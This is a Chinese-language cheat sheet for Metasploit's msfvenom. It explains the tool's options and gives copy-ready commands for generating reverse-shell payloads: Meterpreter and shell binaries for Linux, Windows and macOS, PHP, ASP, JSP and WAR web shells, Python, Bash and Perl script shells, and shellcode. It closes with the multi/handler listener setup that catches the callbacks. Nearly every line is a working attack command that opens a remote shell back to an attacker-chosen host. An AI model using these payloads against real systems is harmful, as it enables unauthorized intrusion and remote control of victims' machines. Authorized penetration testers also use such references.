Msfvenom – Metasploit 生成 Payloads 备忘录

Metasploit 是使用最多的渗透测试框架，本文整理一些 Msfvenom 常用命令；让您快速的生成各类Payloads

msfvenom
选项:

-p, –payload < payload> 指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用& #039;-& #039;或者stdin指定

-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all

-n, –nopsled < length> 为payload预先指定一个NOP滑动长度

-f, –format < format> 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)

-e, –encoder [encoder] 指定需要使用的encoder（编码器）

-a, –arch < architecture> 指定payload的目标架构

–platform < platform> 指定payload的目标平台

-s, –space < length> 设定有效攻击荷载的最大长度

-b, –bad-chars < list> 设定规避字符集，比如: & #039;\x00\xff& #039;

-i, –iterations < count> 指定payload的编码次数

-c, –add-code < path> 指定一个附加的win32 shellcode文件

-x, –template < path> 指定一个自定义的可执行文件作为模板

-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行

–payload-options 列举payload的标准选项

-o, –out < path> 保存payload

-v, –var-name < name> 指定一个自定义的变量，以确定输出格式

–shellest 最小化生成payload

-h, –help 查看帮助选项

–help-formats 查看msf支持的输出格式列表

二进制

Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

Web

PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

脚本

Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

Shellcode
有关所有shellcode，请参阅’msfvenom -help-formats’以获取有关有效参数的信息。

基于Linux的Shellcode

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

基于Windows的Shellcode

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

基于Mac的Shellcode

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

监听
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z